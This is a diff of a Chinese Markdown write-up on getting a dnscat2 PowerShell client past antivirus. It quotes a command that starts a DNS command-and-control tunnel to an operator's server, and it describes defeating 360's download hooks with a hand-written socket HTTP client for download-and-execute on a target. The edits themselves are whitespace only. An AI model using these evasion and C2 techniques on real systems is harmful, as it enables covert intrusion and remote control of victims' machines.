@@ -79,6 +79,7 @@ start-Dnscat2 -PreSharedSecret 12345678 -DNSServer 服务器ip  -Domain www.baid
 
 
    现在使用各大软件扫描，静态查杀已经通过
+   
   ![image](https://user-images.githubusercontent.com/128351726/230552704-80dd3275-5ccc-4a01-83bf-2b37b7cf9424.png)
    
    ### 6、绕过DownloadString限制
@@ -86,9 +87,11 @@ start-Dnscat2 -PreSharedSecret 12345678 -DNSServer 服务器ip  -Domain www.baid
    高达300多kb的客户端，如果靶机没有文件上传的话，还是很麻烦的，所以要想办法从powershell下载执行。
    经测试360把Webclient的所有下载方法都进行了hook检测，只要有下载动作就强行下载。这里我的解决方案就是，使用socket编程，手撸一个http客户端
    注意，只支持http，不支持https
+   
   ![image](https://user-images.githubusercontent.com/128351726/230552751-91b673ba-cd99-40ee-b901-4215676808c4.png)
 
-拷贝到powershell上执行，没有问题
+   拷贝到powershell上执行，没有问题
+
 ![image](https://user-images.githubusercontent.com/128351726/230552874-28a2a6ca-b1e1-4825-811f-153f16a60e63.png)
 
 
